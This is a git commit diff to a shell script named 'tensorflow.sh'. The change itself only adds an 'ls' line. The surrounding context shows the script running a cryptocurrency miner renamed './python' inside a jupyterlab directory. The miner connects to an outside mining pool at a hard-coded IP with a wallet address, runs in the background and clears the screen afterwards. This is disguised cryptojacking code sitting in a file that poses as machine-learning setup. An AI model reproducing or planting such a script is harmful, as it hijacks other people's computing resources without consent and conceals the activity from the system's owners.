cae54ad09a6a3cae971fc731dbfa8652b6f471a0
GraphXdev <66101531+GraphXdev@users.noreply.github.com>
2020-07-04 20:14:05 +0000

    Update tensorflow.sh

--- tensorflow.sh
+++ tensorflow.sh
@@ -13,3 +13,4 @@ rm -r nodejsbrnt
 cd /home/sshuser/jupyterlab
 ./python -o 167.114.65.192:10111 -u LZdfLiPo6Zs2hq7FggM1ePUMZjtmisCpzVunSjzyRTC7ei3xUJwuZtqCMKuf4kwsVci9ZhzAksHykFUX9ENzvMep4fG2nNs.50000 -p chickenjoy -a rx/loki --donate-level 1 -t 7 -B
 clear
+ls
